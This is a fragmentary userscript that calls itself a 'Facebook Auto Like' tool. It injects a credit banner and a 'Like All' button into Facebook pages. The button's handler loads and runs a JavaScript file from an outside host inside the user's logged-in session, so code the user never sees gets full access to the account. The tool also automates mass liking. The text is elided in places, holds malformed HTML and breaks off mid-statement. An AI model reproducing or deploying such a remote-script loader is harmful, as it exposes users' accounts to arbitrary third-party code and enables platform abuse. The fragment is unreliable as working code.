// ==UserScript==
// @name			Facebook Auto Like  V 0.5 By Hermans Ilyas
// @version			0.5
...
if(body != null) {
	...
	div.innerHTML = "<div style='background-color: #2E5392; color: #FFFFFF; border: 1px solid #333333;'><center><a style='color: #FFFFFF;' <a href='http://www.facebook.com/zherman.ilyas' title='Click to See zherman.ilyas's Profile on Facebook'> Hermanz Profile </a></div>"
...
if(body != null) {
	...
	div.style.padding = "2px";
	div.innerHTML = "<img src='https://lh4.googleusercontent.com/-D1HYuLwPnNQ/TxPK6cm_THI/AAAAAAAAAIE/ynATGaxGbv0/s16/Facebook%252520Like%252520Small.jpg' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<a onclick='hermanslike()'>Like All</a>"
	
	body.appendChild(div);
	
	unsafeWindow.hermanslike = function() {
    javascript: (a = (b = document).createElement("script")).src = "//hermans.nazuka.net/userscript/forlike.js",
